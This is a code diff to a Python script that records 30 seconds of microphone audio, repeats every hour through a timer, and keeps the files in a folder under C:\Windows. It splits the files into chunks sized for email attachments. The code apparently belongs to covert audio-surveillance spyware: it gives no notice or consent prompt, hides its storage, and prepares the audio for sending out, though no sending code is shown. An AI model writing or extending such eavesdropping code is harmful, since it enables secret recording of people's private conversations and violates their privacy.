@@ -3,6 +3,7 @@ import os
 import sounddevice as sd
 import wave
 import math
+import threading
 
 # Shared settings
 output_directory = "C:\\Windows\\klm\\output"
@@ -10,6 +11,20 @@ log_directory = "C:\\Windows\\klm\\logs"
 logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 MICROPHONE_DURATION = 30  # 30 seconds for testing, adjust as needed
 MAX_ATTACHMENT_SIZE = 7 * 1024 * 1024  # 7 MB
+lock_path = os.path.join(log_directory, "audio_record.lock")
+
+def acquire_lock():
+    """ Acquire an exclusive lock file to prevent multiple instances. """
+    if os.path.exists(lock_path):
+        logging.error("Another instance is running.")
+        return False
+    with open(lock_path, 'w') as lock_file:
+        lock_file.write("locked")
+    return True
+
+def release_lock():
+    """ Release the exclusive lock. """
+    os.remove(lock_path)
 
 def record_audio():
     try:
@@ -38,6 +53,8 @@ def record_audio():
             logging.info(f"Audio file saved to {audio_path}")
     except Exception as e:
         logging.error(f"Failed to record audio: {e}")
+    finally:
+        release_lock()
 
 def split_audio_file(audio_path):
     chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # 6 MB
@@ -56,5 +73,10 @@ def split_audio_file(audio_path):
             logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
     os.remove(audio_path)  # Delete the original file after splitting
 
+def schedule_recording():
+    if acquire_lock():  # Only proceed if the lock was successfully acquired
+        record_audio()
+    threading.Timer(3600, schedule_recording).start()  # Schedule next recording in 1 hour
+
 if __name__ == "__main__":
-    record_audio()
+    schedule_recording()
